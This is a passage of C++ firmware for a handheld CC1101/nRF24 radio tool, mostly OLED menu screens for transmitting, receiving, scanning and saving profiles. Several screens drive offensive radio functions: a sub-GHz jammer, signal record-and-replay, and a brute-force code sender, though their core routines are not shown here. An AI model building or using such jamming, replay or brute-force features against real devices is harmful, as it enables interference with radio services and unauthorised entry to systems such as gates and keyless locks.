    case CC_AMT:   return "Packets per SEND";
    case CC_GAP:   return "ms between packets";
    case CC_NAME:  return "Name this setup";
  } return "";
}
static inline void ggCcLabel(int f, char* o, size_t n) {
  GgCcProfile& p = *gCcCfg;
  switch (f) {
    case CC_SEND:  snprintf(o,n,">>> SEND NOW <<<"); break;
    case CC_FREQ:  snprintf(o,n,"Freq: %.2fMHz", p.freqMHz); break;
    case CC_MOD:   snprintf(o,n,"Mod: %s", GG_CC_MOD_NAME[p.modulation>3?3:p.modulation]); break;
    case CC_RATE:  snprintf(o,n,"Rate: %s", GG_CC_RATE_NAME[p.dataRate>5?5:p.dataRate]); break;
    case CC_PWR:   snprintf(o,n,"Power: %s", GG_CC_PWR_NAME[p.power>7?7:p.power]); break;
    case CC_DATA:  if(p.plLen>0){o[0]=0; for(int i=0;i<p.plLen&&i<4;i++){char t[4]; snprintf(t,4,"%02X",p.payload[i]); strcat(o,t);} if(p.plLen>4)strcat(o,".."); } else snprintf(o,n,"(empty)"); break;
    case CC_LEN:   snprintf(o,n,"Length: %u", p.plLen); break;
    case CC_AMT:   snprintf(o,n,"Amount: %u", p.burstN); break;
    case CC_GAP:   snprintf(o,n,"Gap: %ums", p.burstGapMs); break;
    case CC_NAME:  snprintf(o,n,"Name: %.12s", p.name); break;
  }
}
static inline void ggCcAdjust(int f, int dir) {
  GgCcProfile& p = *gCcCfg;
  switch (f) {
    case CC_FREQ: {
      float step = 0.01f;
      if (p.freqMHz < 350) step = 1.0f;
      else if (p.freqMHz > 800) step = 1.0f;
      p.freqMHz += dir * step;
      if (p.freqMHz < 300.0f) p.freqMHz = 928.0f;
      if (p.freqMHz > 928.0f) p.freqMHz = 300.0f;
    } break;
    case CC_MOD:   ggCycle(p.modulation, 4, dir); break;
    case CC_RATE:  ggCycle(p.dataRate, 6, dir); break;
    case CC_PWR:   ggCycle(p.power, 8, dir); break;
    case CC_LEN:   ggStepU8(p.plLen, dir, 1, GG_CC_PAYLOAD_MAX); break;
    case CC_AMT:   ggStepU16(p.burstN, dir, 1, 0, 9999); break;
    case CC_GAP:   ggStepU16(p.burstGapMs, dir, 5, 0, 5000); break;
  }
}
static inline void ggScreenCcTx() {
  if (gEditing) {
    if (gEv.up) ggCcAdjust(gSel,+1);
    if (gEv.down) ggCcAdjust(gSel,-1);
    if (gEv.sel || gEv.back) gEditing=false;
  } else {
    ggMove(0, CC_CNT-1);
    if (gEv.back) { ggBack(); return; }
    if (gEv.sel) {
      switch (gSel) {
        case CC_SEND: ggGo(GS_CC_TX_RUN); return;
        case CC_DATA:
          ggOpenBytes(gCcCfg->payload, gCcCfg->plLen, "CC PAYLOAD", false,
                      &gCcCfg->plLen, GG_CC_PAYLOAD_MAX);
          return;
        case CC_NAME: gCcCfg->name[12]=0; ggOpenBytes((uint8_t*)gCcCfg->name, 12, "CC NAME", true); return;
        default: gEditing = true; break;
      }
    }
  }
  static char rows[CC_CNT][22]; const char* p[CC_CNT];
  for(int i=0;i<CC_CNT;i++){ ggCcLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu(gCcCfg==&gCcA?"CC1101-A":"CC1101-B", p, CC_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggCcHint(gSel));
}

// ---------------------------------------------------------------- CC1101 SEND screen
static inline void ggScreenCcTxRun() {
  uint8_t csn = (gCcCfg==&gCcA) ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = (gCcCfg==&gCcA) ? ggCcPresentA : ggCcPresentB;
  if (!gRunInit) {
    gCcTxCount=0; gCcBurstLeft=0;
    if (present) ggCcInit(csn, *gCcCfg);
    gRunInit=true;
    if (ggOled2Ok) ggOled2ShowTxStatus(gCcCfg==&gCcA?"CC1101-A":"CC1101-B", gCcCfg->freqMHz, 0, 0);
  }
  if (gEv.back) { if(present)ggCcIdle(csn); ggBack(); return; }
  if (gEv.sel && present) { gCcBurstLeft=(gCcCfg->burstN<1)?1:gCcCfg->burstN; gCcBurstNext=0; }
  if (gSelHeld && present) { static uint32_t l=0; uint32_t now=millis(); if(now-l>=5){l=now; ggCcTxOnce(csn,*gCcCfg); gCcTxCount++; ggLedTx();} }
  if (gCcBurstLeft && !gSelHeld && present) {
    uint32_t now=millis();
    if ((int32_t)(now-gCcBurstNext)>=0){ ggCcTxOnce(csn,*gCcCfg); gCcTxCount++; gCcBurstLeft--; gCcBurstNext=now+gCcCfg->burstGapMs; ggLedTx(); }
  }
  ggOled.clearDisplay(); ggHeader("CC SEND");
  ggBurstMark(14, 32, (int)(gCcTxCount % 20));
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("%.2fMHz", gCcCfg->freqMHz);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(gCcTxCount));
  ggOled.setTextSize(1); ggOled.setCursor(2,45);
  if (!present) ggOled.print("CC1101 not found!");
  else if (gCcBurstLeft) ggOled.printf("on air  %u left", gCcBurstLeft);
  else if (gSelHeld) ggOled.print("on air (stream)");
  else if (gCcTxCount>0) ggOled.print("sent!");
  else ggOled.printf("plan %upkt", gCcCfg->burstN);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("SEL=fire  hold=stream");
  ggOled.display();
  if (ggOled2Ok && gCcTxCount>0) ggOled2ShowTxStatus(gCcCfg==&gCcA?"CC1101-A":"CC1101-B", gCcCfg->freqMHz, gCcTxCount, 0);
}

// ---------------------------------------------------------------- CC1101 RX screen
static inline void ggScreenCcRx() {
  uint8_t csn = (gCcCfg==&gCcA) ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = (gCcCfg==&gCcA) ? ggCcPresentA : ggCcPresentB;
  if (!gRunInit) {
    gCcRxCount=0; gCcRxLen=0;
    if (present) { ggCcInit(csn, *gCcCfg); ggCcRxBegin(csn); }
    gRunInit=true;
  }
  if (gEv.back) { if(present)ggCcIdle(csn); ggBack(); return; }
  if (gEv.sel) { gCcRxCount=0; gCcRxLen=0; }
  if (present && ggCcRxAvailable(csn)) {
    gCcRxLen = ggCcRxRead(csn, gCcRxLast, GG_CC_PAYLOAD_MAX);
    gCcRxCount++;
    ggLedRx();
    ggCcRxBegin(csn);
  }
  ggOled.clearDisplay(); ggHeader("CC Receive");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("%.2fMHz  got %s", gCcCfg->freqMHz, ggFmtCount(gCcRxCount));
  ggOled.setCursor(2,27); ggOled.printf("len %u  RSSI %ddBm", gCcRxLen, present?ggCcGetRssi(csn):0);
  ggOled.setCursor(2,36); for(int i=0;i<gCcRxLen&&i<10;i++) ggOled.printf("%02X",gCcRxLast[i]);
  ggOled.setCursor(2,45); ggOled.print("\""); for(int i=0;i<gCcRxLen&&i<16;i++){char c=gCcRxLast[i]; ggOled.write((c>=32&&c<127)?c:'.'); } ggOled.print("\"");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE); ggOled.setCursor(2,56); ggOled.print("SEL=reset  BACK=exit");
  ggOled.display();
  if (ggOled2Ok) ggOled2ShowRxStatus(gCcCfg==&gCcA?"CC1101-A":"CC1101-B", gCcCfg->freqMHz, gCcRxCount, gCcRxLast, gCcRxLen);
}

// ---------------------------------------------------------------- FREQ SCANNER
static bool gCcScanPause = false;
static inline void ggScreenCcScan() {
  uint8_t csn = ggCcPresentA ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = ggCcPresentA || ggCcPresentB;
  if (!gRunInit) {
    float lo = gCcCfg->freqMHz - 1.0f;
    float hi = gCcCfg->freqMHz + 1.0f;
    if (present) ggCcScanInit(csn, lo, hi);
    gCcScanPause=false; gRunInit=true;
  }
  if (gEv.back) { if(present)ggCcIdle(csn); ggBack(); return; }
  if (gEv.sel) gCcScanPause=!gCcScanPause;
  if (!gCcScanPause && present) ggCcScanPass(csn);
  ggOled.clearDisplay(); ggHeader("Freq Scanner");
  for(int i=0;i<GG_SCAN_STEPS&&i<126;i++){
    int v = ggCcScanRssi[i] + 128;
    int h = v / 6; if(h>24)h=24; if(h>0) ggOled.drawFastVLine(i+1, 44-h, h, SSD1306_WHITE);
  }
  ggOled.drawFastHLine(0,44,128,SSD1306_WHITE);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setCursor(2,46);
  ggOled.printf("peak %.2fMHz", ggCcScanBestFreq());
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(gCcScanPause?"SEL=run":"SEL=pause");
  ggOled.display();
}

// ---------------------------------------------------------------- RSSI MONITOR
static inline void ggScreenCcRssi() {
  uint8_t csn = ggCcPresentA ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = ggCcPresentA || ggCcPresentB;
  if (!gRunInit) { if(present) ggCcRssiInit(csn, gCcCfg->freqMHz); gRunInit=true; }
  if (gEv.back) { if(present)ggCcIdle(csn); ggBack(); return; }
  if (gEv.up) { gCcCfg->freqMHz+=0.01f; if(present)ggCcRssiInit(csn,gCcCfg->freqMHz); }
  if (gEv.down) { gCcCfg->freqMHz-=0.01f; if(present)ggCcRssiInit(csn,gCcCfg->freqMHz); }
  if (present) ggCcRssiPoll(csn);
  ggOled.clearDisplay(); ggHeader("RSSI Monitor");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,16); ggOled.printf("%.2f MHz", gCcCfg->freqMHz);
  ggOled.setTextSize(2); ggOled.setCursor(2,28);
  ggOled.printf("%d", ggCcRssiLive); ggOled.setTextSize(1); ggOled.print("dBm");
  ggOled.setCursor(80,28); ggOled.printf("pk%d", ggCcRssiPeak);
  int barW = map(constrain(ggCcRssiLive+128, 0, 255), 0, 255, 0, 124);
  ggOled.fillRect(2, 44, barW, 6, SSD1306_WHITE);
  ggOled.drawRect(2, 44, 124, 6, SSD1306_WHITE);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print("UP/DN=freq  BACK=exit");
  ggOled.display();
}

// ---------------------------------------------------------------- SUB-GHz JAMMER
static uint32_t gCcJamPktCount = 0;
static uint32_t gCcJamStartMs = 0;
static inline void ggScreenCcJam() {
  bool present = ggCcPresentA || ggCcPresentB;
  if (!gRunInit) { gCcJamPktCount=0; gCcJamStartMs=millis(); gRunInit=true; }
  if (gEv.back) { ggCcJamStop(); ggLedAlertOff(); ggBack(); return; }
  if (gEv.sel) {
    if (!ggCcJamActive && present) { ggCcJamStart(gCcCfg->freqMHz, 2.0f); ggLedAlertOn(); }
    else { ggCcJamStop(); ggLedAlertOff(); }
  }
  if (ggCcJamActive) { ggCcJamPump(); gCcJamPktCount++; ggLedTx(); }
  uint32_t elapsed = ggCcJamActive ? (millis()-gCcJamStartMs)/1000 : 0;
  ggOled.clearDisplay(); ggHeader("Sub-GHz Jam");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("Center: %.2fMHz", gCcCfg->freqMHz);
  ggOled.setCursor(2,27); ggOled.printf("Width: +/- 1.0 MHz");
  ggOled.setTextSize(2); ggOled.setCursor(2,38);
  if (ggCcJamActive) ggOled.print("JAMMING"); else ggOled.print("IDLE");
  ggOled.setTextSize(1);
  if (ggCcJamActive) { ggOled.setCursor(2,45); ggOled.printf("%s pkt  %lus", ggFmtCount(gCcJamPktCount), (unsigned long)elapsed); }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(ggCcJamActive?"SEL=stop":"SEL=start jam");
  ggOled.display();
  if (ggOled2Ok && ggCcJamActive) ggOled2ShowAttack("Sub-GHz Jam", elapsed, gCcJamPktCount);
}

// ---------------------------------------------------------------- RECORD SIGNAL
static inline void ggScreenCcRec() {
  uint8_t csn = ggCcPresentA ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = ggCcPresentA || ggCcPresentB;
  if (!gRunInit) { gRunInit=true; }
  if (gEv.back) { if(ggCcRecording){ggCcRecordStop(csn);} ggBack(); return; }
  if (gEv.sel && present) {
    if (!ggCcRecording) { ggCcRecordStart(csn, gCcCfg->freqMHz); ggLedRx(); }
    else { ggCcRecordStop(csn); if(ggCcRecBuf.valid){gCcRec=ggCcRecBuf; gCcRecLoaded=true; ggSaveCcRec(gCcRec);} }
  }
  if (ggCcRecording && present) ggCcRecordPoll(csn);
  ggOled.clearDisplay(); ggHeader("Record Signal");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("%.2f MHz  ASK/OOK", gCcCfg->freqMHz);
  ggOled.setCursor(2,28);
  if (ggCcRecording) { ggOled.printf("RECORDING  %u bytes", ggCcRecBuf.len); uint32_t rem=(GG_CC_REC_TIMEOUT_MS-(millis()-ggCcRecStart))/1000; ggOled.setCursor(2,38); ggOled.printf("timeout in %lus",(unsigned long)rem); }
  else if (gCcRecLoaded) { ggOled.printf("Saved: %u bytes", gCcRec.len); ggOled.setCursor(2,38); ggOled.print("ready for replay"); }
  else ggOled.print("No signal recorded");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(ggCcRecording?"SEL=stop+save":"SEL=start recording");
  ggOled.display();
}

// ---------------------------------------------------------------- REPLAY SIGNAL
static inline void ggScreenCcReplay() {
  uint8_t csn = ggCcPresentA ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = ggCcPresentA || ggCcPresentB;
  if (!gRunInit) { if(!gCcRecLoaded) ggLoadCcRec(gCcRec) ? (gCcRecLoaded=true) : (gCcRecLoaded=false); gRunInit=true; }
  if (gEv.back) { if(ggCcReplaying)ggCcReplayStop(csn); ggBack(); return; }
  if (gEv.sel && present && gCcRecLoaded) {
    if (!ggCcReplaying) { ggCcReplayBegin(csn, gCcRec); ggLedAlertOn(); }
    else { ggCcReplayStop(csn); ggLedAlertOff(); }
  }
  if (ggCcReplaying && present) { ggCcReplayPump(csn, gCcRec); ggLedTx(); }
  ggOled.clearDisplay(); ggHeader("Replay Signal");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18);
  if (!gCcRecLoaded) ggOled.print("No recording loaded");
  else {
    ggOled.printf("%.2f MHz  %u bytes", gCcRec.freqMHz, gCcRec.len);
    ggOled.setCursor(2,28);
    if (ggCcReplaying) { ggOled.print("REPLAYING"); ggOled.setCursor(2,38); ggOled.printf("sent %s", ggFmtCount(ggCcReplayCount)); }
    else ggOled.print("Ready to replay");
  }
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56);
  if (!gCcRecLoaded) ggOled.print("Record first");
  else ggOled.print(ggCcReplaying?"SEL=stop":"SEL=start replay");
  ggOled.display();
}

// ---------------------------------------------------------------- BRUTE FORCE
static inline void ggScreenCcBrute() {
  uint8_t csn = ggCcPresentA ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = ggCcPresentA || ggCcPresentB;
  if (!gRunInit) { gRunInit=true; }
  if (gEv.back) { if(ggCcBruteActive)ggCcBruteStop(csn); ggLedAlertOff(); ggBack(); return; }
  if (gEv.sel && present) {
    if (!ggCcBruteActive) { ggCcBruteStart(csn, *gCcCfg, 2, 10); ggLedAlertOn(); }
    else { ggCcBruteStop(csn); ggLedAlertOff(); }
  }
  if (ggCcBruteActive && present) { if(!ggCcBrutePump(csn)) ggLedAlertOff(); else ggLedTx(); }
  float pct = ggCcBruteMax>0 ? (ggCcBruteCode*100.0f/ggCcBruteMax) : 0;
  ggOled.clearDisplay(); ggHeader("Brute Force");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,18); ggOled.printf("%.2f MHz  %uB codes", gCcCfg->freqMHz, ggCcBruteLen);
  ggOled.setCursor(2,28); ggOled.printf("Code: %06lX", (unsigned long)ggCcBruteCode);
  ggOled.setCursor(2,38); ggOled.printf("Sent: %s  %.1f%%", ggFmtCount(ggCcBruteSent), pct);
  int barW = (int)(pct * 1.24f);
  ggOled.drawRect(2,48,124,6,SSD1306_WHITE);
  if (barW>0) ggOled.fillRect(2,48,barW,6,SSD1306_WHITE);
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(ggCcBruteActive?"SEL=stop":"SEL=start brute");
  ggOled.display();
  if (ggOled2Ok && ggCcBruteActive) ggOled2ShowAttack("Brute Force", 0, ggCcBruteSent);
}

// ---------------------------------------------------------------- CW SIGNAL GENERATOR
static inline void ggScreenCcCw() {
  uint8_t csn = ggCcPresentA ? GG_PIN_CCA_CSN : GG_PIN_CCB_CSN;
  bool present = ggCcPresentA || ggCcPresentB;
  if (gEv.back) { if(ggCcCwActive){ggCcCwStop(csn);} ggBack(); return; }
  if (!ggCcCwActive && gEv.up) { gCcCfg->freqMHz+=0.1f; if(gCcCfg->freqMHz>928)gCcCfg->freqMHz=300; }
  if (!ggCcCwActive && gEv.down) { gCcCfg->freqMHz-=0.1f; if(gCcCfg->freqMHz<300)gCcCfg->freqMHz=928; }
  if (gEv.sel && present) {
    if (!ggCcCwActive) ggCcCwStart(csn, gCcCfg->freqMHz);
    else ggCcCwStop(csn);
  }
  if (ggCcCwActive) { ggCcCwPump(csn); ggLedTx(); }
  ggOled.clearDisplay(); ggHeader("Signal Gen");
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(2,16); ggOled.printf("Freq: %.2f MHz", gCcCfg->freqMHz);
  ggOled.setTextSize(2); ggOled.setCursor(2,28);
  ggOled.print(ggCcCwActive?"ON AIR":"OFF");
  ggOled.setTextSize(1); ggOled.setCursor(2,46); ggOled.print("continuous carrier");
  ggOled.drawFastHLine(0,54,128,SSD1306_WHITE);
  ggOled.setCursor(2,56); ggOled.print(ggCcCwActive?"SEL=stop":"SEL=start  UP/DN freq");
  ggOled.display();
}

// ---------------------------------------------------------------- CC1101 PROFILES
static inline void ggScreenCcProf() {
  if (gEv.up) ggStepU8(gSlot,-1,0,GG_CC_PROFILE_SLOTS-1);
  if (gEv.down) ggStepU8(gSlot,+1,0,GG_CC_PROFILE_SLOTS-1);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) { gSel=0; ggGo(GS_CC_PROFACT); return; }
  static char rows[GG_CC_PROFILE_SLOTS][22]; const char* p[GG_CC_PROFILE_SLOTS];
  for(int i=0;i<GG_CC_PROFILE_SLOTS;i++){
    if(ggCcSlotUsed(i)){GgCcProfile t; ggCcProfLoad(i,t); snprintf(rows[i],22,"%d %-8s %.0f",i,t.name,t.freqMHz);}
    else snprintf(rows[i],22,"%d  (empty)",i); p[i]=rows[i];
  }
  int top=gSlot<4?0:gSlot-3; ggMenu("CC Profiles", p, GG_CC_PROFILE_SLOTS, gSlot, top, "SEL=open  BACK");
}
static inline void ggScreenCcProfAct() {
  bool used = ggCcSlotUsed(gSlot); int n = used?3:1;
  ggMove(0, n-1);
  if (gEv.back) { ggBack(); return; }
  if (gEv.sel) {
    if (!used) { ggCcProfSave(gSlot,*gCcCfg); ggBack(); return; }
    if (gSel==0) { GgCcProfile t; if(ggCcProfLoad(gSlot,t)){if(t.plLen<1||t.plLen>GG_CC_PAYLOAD_MAX)t.plLen=5; *gCcCfg=t;} ggBack(); return; }
    if (gSel==1) { ggCcProfSave(gSlot,*gCcCfg); ggBack(); return; }
    if (gSel==2) { ggCcProfErase(gSlot); ggBack(); return; }
  }
  char t[18]; snprintf(t,sizeof(t),"CC Slot %u",gSlot);
  static const char* const U[]={"Load this","Overwrite","Delete"}; static const char* const E[]={"Save here"};
  int lt=0; ggMenu(t, used?U:E, n, gSel, lt, used?"":"stores current CC setup");
}

// ---------------------------------------------------------------- TRANSMIT config
// One screen holds the whole send: channel, speed, power, the payload, and how
// it's sent - Amount (packets per SEND) and Gap (ms between them). SEND NOW fires
// it. Every hint is kept <=21 chars so it never clips.
enum { N_SEND=0, N_CH, N_RATE, N_POWER, N_KIND, N_DATA, N_LEN, N_AMT, N_GAP, N_PLIB, N_ADDR, N_ACK, N_ADV, N_NAME, N_SAVE, N_CNT };
static const char* ggNrfHint(int f) {
  bool b = (gNrfCfg == &gNrfB);
  switch (f) {
    case N_SEND: return b ? "B sends when A does" : "Fire the payload";
    case N_CH:   return "2.4GHz channel 0-125";
    case N_RATE: return "Speed 250k/1M/2M";
    case N_POWER:return "Output strength";
    case N_KIND: return "HEX/TEXT = you type";
    case N_DATA: return "Edit your payload";
    case N_LEN:  return "How many bytes 1-32";
    case N_AMT:  return "Packets per SEND";
    case N_GAP:  return "ms between packets";
    case N_PLIB: return "Your saved payloads";
    case N_ADDR: return "Must match receiver";
    case N_ACK:  return "Wait for a reply?";
    case N_ADV:  return "Address, CRC, resend";
    case N_NAME: return "Name this setup";
    case N_SAVE: return "Save the whole setup";
  } return "";
}
static inline void ggNrfLabel(int f, char* o, size_t n) {
  GgNrfProfile& p = *gNrfCfg;
  bool autoData = (p.plKind!=GG_PL_HEX && p.plKind!=GG_PL_TEXT);
  switch (f) {
    case N_SEND: snprintf(o,n, (gNrfCfg==&gNrfB) ? "(B sends w/ DUAL-TX)" : "SEND NOW >"); break;
    case N_CH:   snprintf(o,n,"Channel: %u", p.channel); break;
    case N_RATE: snprintf(o,n,"Speed: %s", GG_RATE_NAME[p.rate>2?2:p.rate]); break;
    case N_POWER:snprintf(o,n,"Power: %s", GG_PWR_NAME[p.power>3?3:p.power]); break;
    case N_KIND: snprintf(o,n,"Data type: %s", GG_PL_NAME[p.plKind>6?6:p.plKind]); break;
    // Payload row ALWAYS opens the editor now. For an "auto" type we show (auto)
    // but the ">" tells you it's still openable - typing bytes switches to HEX.
    case N_DATA: autoData? snprintf(o,n,"Payload: (auto) >") : snprintf(o,n,"Payload: %02X.. >",p.payload[0]); break;
    case N_LEN:  snprintf(o,n,"Length: %u", p.plLen); break;
    case N_AMT:  snprintf(o,n,"Amount: %u", p.burstN); break;
    case N_GAP:  snprintf(o,n,"Gap: %u ms", p.burstGapMs); break;
    case N_PLIB: snprintf(o,n,"My payloads >"); break;
    case N_ADDR: snprintf(o,n,"Address: %02X%02X.. >",p.addr[0],p.addr[1]); break;
    case N_ACK:  snprintf(o,n,"Ack: %s", p.autoAck?"ON":"OFF"); break;
    case N_ADV:  snprintf(o,n,"Advanced >"); break;
    case N_NAME: snprintf(o,n,"Name: %s >", p.name); break;
    case N_SAVE: snprintf(o,n,"Save all as preset >"); break;
  }
}
static inline void ggNrfAdjust(int f, int dir) {
  GgNrfProfile& p = *gNrfCfg;
  switch (f) {
    case N_CH: ggStepU8(p.channel, dir, GG_NRF_CH_MIN, GG_NRF_CH_MAX); break;
    case N_RATE: ggCycle(p.rate,3,dir); break;
    case N_POWER: ggCycle(p.power,4,dir); break;
    case N_KIND: ggCycle(p.plKind,GG_PL_COUNT,dir); break;
    case N_LEN: ggStepU8(p.plLen, dir, 1, GG_PAYLOAD_MAX); break;
    case N_AMT: ggStepU16(p.burstN,dir,10,1,2000); break;
    case N_GAP: ggStepU16(p.burstGapMs,dir,5,0,2000); break;
    case N_ACK: p.autoAck = !p.autoAck; break;
  }
}
static inline void ggScreenNrf() {
  if (gEditing) {
    if (gEv.up) ggNrfAdjust(gSel,+1);
    if (gEv.down) ggNrfAdjust(gSel,-1);
    if (gEv.sel || gEv.back) gEditing=false;
  } else {
    ggMove(0, N_CNT-1);
    if (gEv.back) { ggBack(); return; }
    if (gEv.sel) {
      bool editingB = (gNrfCfg == &gNrfB);
      switch (gSel) {
        case N_SEND: if(!editingB){ ggGo(GS_NRF_TX); return; } break;
        case N_DATA:
          // Always let you type a payload. If the data type is an "auto" kind,
          // switch it to HEX so the bytes you enter are the bytes that go out -
          // no more dead "(auto)" row. Length is editable right here too.
          if (gNrfCfg->plKind!=GG_PL_HEX && gNrfCfg->plKind!=GG_PL_TEXT) gNrfCfg->plKind = GG_PL_HEX;
          ggOpenBytes(gNrfCfg->payload, gNrfCfg->plLen, "PAYLOAD",
                      gNrfCfg->plKind==GG_PL_TEXT, &gNrfCfg->plLen, GG_PAYLOAD_MAX);
          return;
        case N_PLIB: gPaySlot=0; ggGo(GS_PAYLIB); return;
        case N_ADDR: ggOpenBytes(gNrfCfg->addr, GG_ADDR_WIDTH, "ADDRESS", false); return;
        case N_NAME: gNrfCfg->name[12]=0; ggOpenBytes((uint8_t*)gNrfCfg->name, 12, "NAME", true); return;
        case N_ADV:  ggGo(GS_ADV); return;
        case N_SAVE: gSlot=0; ggGo(GS_NPROF); return;
        default: gEditing = true; break;
      }
    }
  }
  static char rows[N_CNT][22]; const char* p[N_CNT];
  for (int i=0;i<N_CNT;i++){ ggNrfLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu(gNrfCfg==&gNrfA?"Transmit":"Radio B", p, N_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggNrfHint(gSel));
}

// ---------------------------------------------------------------- ADVANCED
// (Amount + Gap live on the Transmit screen now; Advanced is the deep radio match.)
enum { A_AW=0, A_CRC, A_RETRY, A_CNT };
static const char* ggAdvHint(int f){
  switch(f){ case A_AW:return "Address length 3-5"; case A_CRC:return "Error-check length";
    case A_RETRY:return "Resend tries 0-15"; } return "";
}
static inline void ggAdvLabel(int f, char* o, size_t n){
  GgNrfProfile& p=*gNrfCfg;
  switch(f){
    case A_AW:      snprintf(o,n,"Addr width: %u", p.addrWidth); break;
    case A_CRC:     snprintf(o,n,"CRC: %s", GG_CRC_NAME[p.crc>2?2:p.crc]); break;
    case A_RETRY:   snprintf(o,n,"Retries: %u", p.retries); break;
  }
}
static inline void ggAdvAdjust(int f,int dir){
  GgNrfProfile& p=*gNrfCfg;
  switch(f){
    case A_AW: ggStepU8(p.addrWidth,dir,3,5); break;
    case A_CRC: ggStepU8(p.crc,dir,0,2); break;
    case A_RETRY: ggStepU8(p.retries,dir,0,15); break;
  }
}
static inline void ggScreenAdv(){
  if (gEditing){ if(gEv.up)ggAdvAdjust(gSel,+1); if(gEv.down)ggAdvAdjust(gSel,-1); if(gEv.sel||gEv.back)gEditing=false; }
  else { ggMove(0,A_CNT-1); if(gEv.back){ggBack();return;} if(gEv.sel)gEditing=true; }
  static char rows[A_CNT][22]; const char* p[A_CNT];
  for(int i=0;i<A_CNT;i++){ ggAdvLabel(i,rows[i],sizeof(rows[i])); p[i]=rows[i]; }
  ggMenu("Advanced", p, A_CNT, gSel, gTop, gEditing?"UP/DN change  SEL ok":ggAdvHint(gSel));
}

// ---------------------------------------------------------------- MORE MODES
static const char* const MODE_ITEMS[] = { "Beacon (auto-send)", "Range check", "Find clear channel", "Receive / listen" };
static const char* const MODE_HINTS[] = { "Send on a timer", "Steady tone for range", "See busy channels", "Show packets you get" };
static inline void ggScreenModes(){
  ggMove(0,3);
  if (gEv.back){ ggBack(); return; }
  if (gEv.sel){ ggGo(gSel==0?GS_NRF_BEACON: gSel==1?GS_NRF_CARRIER: gSel==2?GS_NRF_SCAN: GS_NRF_RX); return; }
  ggMenu("More modes", MODE_ITEMS, 4, gSel, gTop, MODE_HINTS[gSel]);
}

// ---------------------------------------------------------------- SEND screen (burst)
static inline void ggScreenNrfTx() {
  if (!gRunInit) {
    gTxCount=0; gAckOk=0; gTxFail=0; gRxCount=0; gBurstLeft=0; ggNrfConfigureForTx(); gRunInit=true;
    if (gAutoFire) { gBurstLeft=(gNrfA.burstN<1)?1:gNrfA.burstN; gBurstNext=0; gAutoFire=false; }  // Load&send fires the burst
  }
  if (gEv.back) { ggStopTx(); ggBack(); return; }
  if (gEv.up)   { ggStepU8(gNrfA.channel,+1,GG_NRF_CH_MIN,GG_NRF_CH_MAX); ggNrfConfigureForTx(); }
  if (gEv.down) { ggStepU8(gNrfA.channel,-1,GG_NRF_CH_MIN,GG_NRF_CH_MAX); ggNrfConfigureForTx(); }
  if (gEv.sel)  { gPhase+=4; gBurstLeft = (gNrfA.burstN<1)?1:gNrfA.burstN; gBurstNext=0; }  // fire a burst
  if (gSelHeld) { static uint32_t l=0; uint32_t now=millis(); if (now-l>=3){ l=now; gPhase++; ggNrfSendOne(); } } // stream while held
  if (gBurstLeft && !gSelHeld) {                       // run the burst, non-blocking
    uint32_t now=millis();
    if ((int32_t)(now-gBurstNext) >= 0){ gPhase++; ggNrfSendOne(); gBurstLeft--; gBurstNext=now+gNrfA.burstGapMs; }
  }
  ggNrfPollPair();
  uint32_t plan = (uint32_t)(gNrfA.burstN?gNrfA.burstN:1) * gNrfA.burstGapMs;   // est duration
  ggOled.clearDisplay(); ggHeader("SEND");
  ggBurstMark(14, 32, (int)gPhase);
  ggOled.setTextColor(SSD1306_WHITE); ggOled.setTextSize(1);
  ggOled.setCursor(34,18); ggOled.printf("CH%u %s", gNrfA.channel, GG_RATE_NAME[gNrfA.rate>2?2:gNrfA.rate]);
  ggOled.setTextSize(2); ggOled.setCursor(34,28); ggOled.print(ggFmtCount(gTxCount));
  ggOled.setTextSize(1); ggOled.setCursor(2,45);
  // gTxCount = packets pushed OUT on air. Idle shows the plan (amount + est time);
  // after firing, the count and ack tally prove it transmitted.
  if (gBurstLeft)                 ggOled.printf("on air  %u left", gBurstLeft);
  else if (gSelHeld)              ggOled.print("on air (stream)");
  else if (gTxCount>0 && gSet.nrfMode==GG_NM_PAIR && gNrfA.autoAck)
                                  ggOled.printf("on air  acked %s", ggFmtCount(gAckOk));
  else if (gTxCount>0)            ggOled.print("on air - sent!");
